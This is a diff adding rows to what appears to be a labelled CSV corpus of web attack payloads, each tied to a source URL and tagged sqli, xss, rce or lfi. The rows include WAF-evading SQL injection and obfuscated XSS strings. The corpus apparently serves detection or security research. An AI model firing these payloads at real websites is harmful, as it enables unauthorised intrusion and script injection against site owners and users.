@@ -476,3 +476,6 @@ https://vulners.com/github/GHSA-8FV7-WQ38-F5C9?utm_source=rss&utm_medium=rss&utm
 https://www.youtube.com/watch?v=LZqTeVuaIL4,"null /*!12345union*/ select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",sqli
 https://twitter.com/Cyber_Berkkut/status/1691944550200119713,"""&gt;&lt;Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ==""))&gt;",xss
 https://fares7elsadek.medium.com/my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss-e0534b6f05e4,"<=script>=alert(""hacked"")<=/scirpt>=",xss
+https://vulners.com/github/GHSA-8XHR-X3V8-RGHJ?utm_source=rss&utm_medium=rss&utm_campaign=rss,"services.logging.getLogger(""foo"").error(""Job content executed"")",rce
+https://vulners.com/cve/CVE-2023-41044?utm_source=rss&utm_medium=rss&utm_campaign=rss,/api/system/debug/support/bundle/download/{filename},lfi
+https://t.me/ZerodayExploitware/2233,<SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>,xss
